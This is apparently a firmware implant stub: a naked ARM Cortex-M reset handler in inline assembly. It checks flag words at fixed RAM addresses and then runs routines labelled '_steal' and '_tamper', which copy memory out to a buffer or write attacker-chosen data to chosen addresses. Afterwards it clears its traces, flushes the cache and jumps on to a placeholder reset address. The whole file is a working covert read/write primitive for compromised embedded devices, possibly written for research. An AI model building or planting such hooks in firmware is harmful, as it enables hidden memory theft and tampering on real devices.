__attribute__((naked)) void _reset(void)
{
	__asm__(
		// ctx save
		"push.w {r0,r1,r2,r3,r4}\n\t"
    // read condition
		"_cond1:\n\t"
		"ldr r0, =0x4094000\n\t"
		"ldr r0, [r0]\n\t"
		"cmp r0, #0\n\t"
		"bne _steal\n\t"
		// write condition
		"_cond2:\n\t"
		"ldr r0, =0x4094010\n\t"
		"ldr r0, [r0]\n\t"
		"cmp r0, #0\n\t"
		"bne _tamper\n\t"
		"b _clear\n\t"

		// read primitive
		"_steal:\n\t"
		"ldr r1, =0x4094004\n\t"
		"ldr r1, [r1]\n\t"
		"ldr r3, =0x4095000\n\t"
		"_loop:\n\t"
		"ldr r2, [r0], #4\n\t"
		"str r2, [r3], #4\n\t"
		"cmp r0, r1\n\t"
		"blt _loop\n\t"
		"ldr r0, =0x409400C\n\t"
		"ldr r1, =0xf00ba\n\t"
		"str r1, [r0]\n\t"
		"b _cond2\n\t"

		// write primitive
		"_tamper:\n\t"
		"ldr r1, =0x4094014\n\t"
		"ldr r1, [r1]\n\t"
		"ldr r3, =0x4094018\n\t"
		"ldr r3, [r3]\n\t"
		"_loop2:\n\t"
		"ldr r2, [r0], #4\n\t"
		"str r2, [r3], #4\n\t"
		"cmp r0, r1\n\t"
		"blt _loop2\n\t"
		"ldr r0, =0x4094020\n\t"
		"ldr r1, =0xbaf00\n\t"
		"str r1, [r0]\n\t"
		"b _clear\n\t"

		// clean up the read primitive
		"_clear:\n\t"
		"ldr r0, =0x4094000\n\t"
		"ldr r1, =0\n\t"
		"str r1, [r0], #4\n\t" // 0x00 read start
		"str r1, [r0]\n\t" // 0x04 read end
    // make sure visible in CPU
    "dsb\n\t"
		"ldr r0, =0x4094000\n\t"
		"ldr r2, =0xE000E000\n\t"
		"str r0, [r2, #0xF68]\n\t"
    "add r0, r0, #0x4\n\t"
    "str r0, [r2, #0xF68]\n\t"
		
		// shall we clean up the write primitive?
		"ldr r0, =0x409401C\n\t"
		"ldr r0, [r0]\n\t"
		"cmp r0, #0\n\t"
		"beq _go\n\t"
		// clean up the write primitive
		"ldr r0, =0x4094010\n\t"
		"ldr r1, =0\n\t"
		"str r1, [r0], #4\n\t" // 0x10 write src start
		"str r1, [r0], #4\n\t" // 0x14 write src end
		"str r1, [r0], #4\n\t" // 0x18 write dst start
		"_go:"
    "pop.w {r0,r1,r2,r3,r4}\n\t"
		"ldr.w pc, =0xdeadbeef\n\t");
}
